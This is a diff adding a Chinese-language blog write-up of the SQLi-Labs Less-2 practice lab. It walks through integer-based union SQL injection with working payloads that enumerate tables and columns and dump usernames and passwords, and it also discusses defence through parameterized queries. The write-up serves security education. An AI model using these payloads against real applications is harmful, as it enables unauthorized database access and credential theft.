@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Writeup: SQLi-Labs Less-2 - Y11516</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&family=Orbitron:wght@700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #0a0e17; background-image: radial-gradient(circle at 50% 20%, rgba(0, 240, 255, 0.05) 0%, transparent 50%); font-family: 'Inter', sans-serif; color: #ccd6f6; padding: 6rem 1rem 4rem 1rem; display: flex; justify-content: center; line-height: 1.8; }
+        .navbar { position: fixed; top: 0; left: 0; width: 100%; padding: 1.2rem 5%; display: flex; justify-content: space-between; align-items: center; background: rgba(10, 14, 23, 0.7); backdrop-filter: blur(12px); border-bottom: 1px solid rgba(0, 240, 255, 0.15); z-index: 999; }
+        .logo { font-family: 'Orbitron', sans-serif; font-weight: 900; font-size: 1.2rem; color: #00f0ff; letter-spacing: 2px; }
+        .nav-links a { color: #8892b0; text-decoration: none; margin-left: 2rem; font-size: 0.9rem; transition: 0.3s; }
+        .nav-links a:hover { color: #00f0ff; }
+        .post-container { max-width: 820px; width: 100%; background: rgba(255,255,255,0.03); backdrop-filter: blur(6px); border: 1px solid rgba(255,255,255,0.06); border-radius: 32px; padding: 3rem; box-shadow: 0 30px 80px rgba(0, 0, 0, 0.6); }
+        h1 { font-family: 'Orbitron', sans-serif; font-size: 2.2rem; margin-bottom: 0.5rem; color: #00f0ff; text-shadow: 0 0 15px rgba(0, 240, 255, 0.3); }
+        .date { color: #475569; font-size: 0.9rem; margin-bottom: 2rem; padding-bottom: 1rem; border-bottom: 1px solid rgba(0, 240, 255, 0.2); display: flex; gap: 15px; flex-wrap: wrap;}
+        .date span { background: rgba(0, 240, 255, 0.1); padding: 0.2rem 0.8rem; border-radius: 12px; color: #00f0ff; font-size: 0.8rem; }
+        h2 { color: #a855f7; font-size: 1.4rem; margin: 2.5rem 0 1rem 0; border-left: 4px solid #a855f7; padding-left: 10px; }
+        h3 { color: #e2e8f0; font-size: 1.15rem; margin: 1.8rem 0 0.8rem 0; }
+        h4 { color: #c084fc; font-size: 1rem; margin: 1.2rem 0 0.6rem 0; }
+        p { margin-bottom: 1rem; color: #94a3b8; }
+        strong { color: #e2e8f0; }
+        code { background: rgba(0, 240, 255, 0.1); padding: 0.2rem 0.4rem; border-radius: 4px; font-family: 'Courier New', monospace; color: #00f0ff; font-size: 0.95rem; }
+        pre { background: #0f172a; padding: 1rem; border-radius: 8px; overflow-x: auto; border: 1px solid #1e293b; margin-bottom: 1rem; }
+        pre code { background: transparent; padding: 0; color: #e2e8f0; }
+        ul, ol { padding-left: 1.5rem; margin-bottom: 1rem; color: #94a3b8; }
+        li { margin-bottom: 0.5rem; }
+        .highlight-box { background: rgba(168, 85, 247, 0.05); border: 1px solid rgba(168, 85, 247, 0.2); border-radius: 12px; padding: 1.5rem; margin-bottom: 1rem; }
+        .note-box { background: rgba(0, 240, 255, 0.05); border-left: 3px solid #00f0ff; padding: 1rem; margin-bottom: 1rem; border-radius: 0 8px 8px 0; }
+        .action-bar { display: flex; justify-content: center; gap: 1.5rem; margin-top: 3rem; flex-wrap: wrap; }
+        .action-link { color: #00f0ff; text-decoration: none; border: 1px solid #00f0ff; padding: 10px 24px; border-radius: 30px; transition: 0.3s; }
+        .action-link:hover { background: rgba(0, 240, 255, 0.1); }
+        .action-link.secondary { color: #8892b0; border-color: #475569; }
+        @media (max-width: 640px) { .post-container { padding: 1.5rem; } h1 { font-size: 1.5rem; } .action-bar { flex-direction: column; } }
+    </style>
+</head>
+<body>
+    <nav class="navbar">
+        <div class="logo"><i class="fas fa-shield-halved"></i> Y11516</div>
+        <div class="nav-links">
+            <a href="/ctf.html"><i class="fas fa-bug"></i> CTF 总库</a>
+            <a href="/"><i class="fas fa-house"></i> 主页</a>
+        </div>
+    </nav>
+
+    <div class="post-container">
+        <h1><i class="fas fa-database"></i> SQLi-Labs Less-2</h1>
+        <div class="date">
+            <span><i class="far fa-calendar-alt"></i> 2026年9月25日</span>
+            <span><i class="fas fa-tag"></i> SQLi-Labs</span>
+            <span><i class="fas fa-tag"></i> Web安全</span>
+            <span><i class="fas fa-tag"></i> SQL注入</span>
+            <span><i class="fas fa-tag"></i> 数字型注入</span>
+        </div>
+
+        <h2>一、题目信息</h2>
+        <ul>
+            <li><strong>题目名称：</strong>SQLi-Labs Less-2</li>
+            <li><strong>题目平台：</strong>SQLi-Labs 本地靶场</li>
+            <li><strong>题目类型：</strong>Web安全 / SQL注入 / 数字型联合注入</li>
+            <li><strong>靶场链接：</strong>http://localhost:8081/Less-2/（本地环境）</li>
+            <li><strong>涉及工具：</strong>Chrome浏览器</li>
+        </ul>
+
+        <h2>二、解题步骤</h2>
+        
+        <h3>1. 分析题目考什么</h3>
+        <p>本题的核心考点是<strong>数字型联合注入（Integer-based Union SQL Injection）</strong>。与 Less-1 不同，后端 SQL 语句中变量 <code>id</code> 没有被引号包裹，直接以数字形式拼接到 SQL 语句中。攻击者无需使用单引号闭合，直接利用 <code>order by</code> 和 <code>union select</code> 即可完成注入攻击。</p>
+
+        <h3>2. 怎么想（破题思路）</h3>
+        <ul>
+            <li>访问页面，URL 为 <code>?id=1</code>，页面正常显示 Login name 和 Password。</li>
+            <li>尝试输入单引号 <code>?id=1'</code>，页面报错（报错信息与 Less-1 可能略有不同），说明此处是数字型注入点。</li>
+            <li>直接用 <code>order by</code> 判断字段数，用 <code>union select</code> 确定回显位。</li>
+            <li>通过 <code>information_schema</code> 系统表查库名、表名、列名，最后查数据。</li>
+        </ul>
+
+        <h3>3. 怎么解（详细步骤与踩坑记录）</h3>
+        
+        <div class="note-box">
+            <h4><i class="fas fa-exclamation-triangle"></i> 踩坑记录：惯性思维在数字型注入中加了单引号</h4>
+            <p><strong>踩坑情况：</strong>习惯了 Less-1 的字符型注入，在 Less-2 的 Payload 里下意识地加上了 <code>'</code>（单引号），导致注入失败或报错。</p>
+            <p><strong>原因分析：</strong>Less-2 的后端代码是 <code>SELECT * FROM users WHERE id = $id LIMIT 0,1;</code>，没有引号。如果你传入 `1'`，SQL 语句变成 `id = 1' LIMIT 0,1`，这里的单引号会导致语法错误。</p>
+            <p><strong>改进方式：</strong>去掉所有单引号，直接使用纯数字或注释符进行注入。<strong>这就是数字型和字符型注入的最核心区别。</strong></p>
+        </div>
+
+        <div class="highlight-box">
+            <h4><i class="fas fa-terminal"></i> 详细实操步骤（逐字解析）</h4>
+            
+            <p><strong>第一步：爆出数据库名和版本（图1）</strong></p>
+            <pre><code>?id=-1 union select 1,database(),version() --+</code></pre>
+            <p><strong>逐字解析：</strong>因为不需要单引号闭合，所以直接构造 Payload。<code>-1</code> 是为了让前面的查询失效，<code>union select</code> 是联合查询。<code>database()</code> 回显当前数据库名（<code>security</code>），<code>version()</code> 回显数据库版本（<code>5.5.44</code>）。<code>--+</code> 用于注释掉原语句后面的 <code>LIMIT 0,1</code>，防止其干扰。</p>
+
+            <p><strong>第二步：爆出当前数据库的所有表名（图2）</strong></p>
+            <pre><code>?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</code></pre>
+            <p><strong>逐字解析：</strong>从 <code>information_schema.tables</code> 查表名，<code>table_schema=database()</code> 限制查询范围。回显 <code>emails,referers,uagents,users</code>，锁定目标 <code>users</code> 表。</p>
+
+            <p><strong>第三步：爆出 users 表的字段名（图3）</strong></p>
+            <pre><code>?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+</code></pre>
+            <p><strong>逐字解析：</strong>从 <code>information_schema.columns</code> 查列名，回显 <code>id,username,password</code>。注意这里 <code>'users'</code> 需要加单引号，因为它是字符串查询条件（字符型），而不是数字型。</p>
+
+            <p><strong>第四步：爆出最终账号密码（图4）</strong></p>
+            <pre><code>?id=-1 union select 1,group_concat(username,0x3a,password),3 from users --+</code></pre>
+            <p><strong>逐字解析：</strong><code>0x3a</code> 是冒号的十六进制，用于分隔用户名和密码。<code>from users</code> 直接从表里查。最终回显 <code>admin:admin</code> 等数据。</p>
+        </div>
+
+        <h3>4. 怎么迁移（跨领域联想）</h3>
+        <ul>
+            <li><strong>API 接口测试：</strong>现代 RESTful API 中，像 <code>GET /api/users/1</code> 这样的数字型参数非常常见。如果后端没做参数化查询，这里就是一个天然的数字型注入点。</li>
+            <li><strong>ORM 框架误区：</strong>很多人以为用了 ORM 就绝对安全。但如果使用了字符串拼接（如 <code>User.where("id = " + id)</code>），同样会中招。防御必须使用占位符绑定（<code>User.where("id = ?", id)</code>）。</li>
+            <li><strong>大数据分析：</strong>数据分析师在写 Hive SQL 或 Spark SQL 时，如果直接拼接用户输入的参数，也同样面临 SQL 注入风险。</li>
+        </ul>
+
+        <h2>三、名词大全与原理深度复盘</h2>
+        
+        <div class="highlight-box">
+            <h4>1. 数字型注入 vs 字符型注入</h4>
+            <p>两者的核心区别在于<strong>后端 SQL 语句中，变量是否被引号包裹</strong>。<br>
+            - 字符型：<code>WHERE id = '$id'</code>（需要单引号闭合）<br>
+            - 数字型：<code>WHERE id = $id</code>（无需引号，直接拼接）<br>
+            数字型注入中，如果错误地加入单引号，反而会导致 SQL 语法错误。</p>
+
+            <h4>2. information_schema 数据库</h4>
+            <p>MySQL 自带的“数据库户口本”。它记录了当前数据库服务器所有的数据库名（SCHEMATA）、表名（TABLES）、列名（COLUMNS）。SQL 注入中利用它来摸清数据库结构。</p>
+
+            <h4>3. group_concat() 函数</h4>
+            <p>MySQL 的聚合函数。它将多行查询的结果合并成一个字符串输出（默认用逗号分隔）。在注入时，它可以避免因为查询结果过多而导致页面只显示第一行的问题。</p>
+
+            <h4>4. 0x3a 十六进制</h4>
+            <p>ASCII 码表中，`:`（冒号）的十六进制是 `0x3a`。在注入中用它拼接用户名和密码，能让结果一目了然（如 `admin:admin`），避免因为缺失分隔符而无法分辨哪个是用户名哪个是密码。</p>
+        </div>
+
+        <h2>四、题目思考</h2>
+        
+        <h3>1. 这跟前面的题有什么区别？</h3>
+        <ul>
+            <li><strong>与 Less-1 的区别：</strong>Less-1 是字符型，Payload 必须包含 <code>'</code> 来闭合引号；Less-2 是数字型，Payload 直接以数字开头，不能带单引号。</li>
+            <li><strong>与 XSS 的区别：</strong>XSS 攻击前端浏览器，SQL 注入攻击后端数据库。前者骗用户，后者骗数据库。</li>
+        </ul>
+
+        <h3>2. 这种题目的出现原因</h3>
+        <p>后端开发人员为了图方便，直接将 URL 中的数字参数拼接到 SQL 语句中。他们认为“既然是数字，怎么可能有注入”，却忽略了 SQL 语法的复杂性（如利用 `union` 进行拓展）。这在早期的企业官网、政府网站中极为常见。</p>
+
+        <h3>3. 这种应用在实际中如何体现？</h3>
+        <p>在真实红蓝对抗中，数字型注入是攻击者最常遇到的场景之一（因为 ID 通常都是数字）。一旦发现，攻击者会立刻使用 SQLMap 或手工联合注入，快速 dump 出数据库里的所有数据。</p>
+
+        <h3>4. 如何抽象理解概念（大白话理解）</h3>
+        <div class="highlight-box">
+            <p><strong>把数据库比作一个“点餐机器人”：</strong></p>
+            <ul>
+                <li><strong>字符型注入（Less-1）：</strong>机器人点餐需要你说：“来一份1号餐”（<code>id='1'</code>）。你如果想搞破坏，必须想办法把前面的单引号闭合掉，再插入恶意指令。</li>
+                <li><strong>数字型注入（Less-2）：</strong>机器人点餐只需要你说数字：“1”。你不需要任何引号，直接命令它：“1，<strong>顺便把所有的餐单都给我</strong>”（<code>id=1 union select ...</code>）。因为缺少了引号的“封印”，数字型注入往往比字符型注入利用起来更简单、更直接。</li>
+            </ul>
+        </div>
+
+        <p style="margin-top: 2rem; text-align: center; color: #475569;"><i class="fas fa-code"></i> 做一道题，就要往自己脑子里装点东西。</p>
+
+        <div class="action-bar">
+            <a href="/ctf.html" class="action-link"><i class="fas fa-arrow-left"></i> 返回 CTF 总库</a>
+            <a href="/" class="action-link secondary"><i class="fas fa-house"></i> 返回主页</a>
+        </div>
+    </div>
+</body>
+</html>
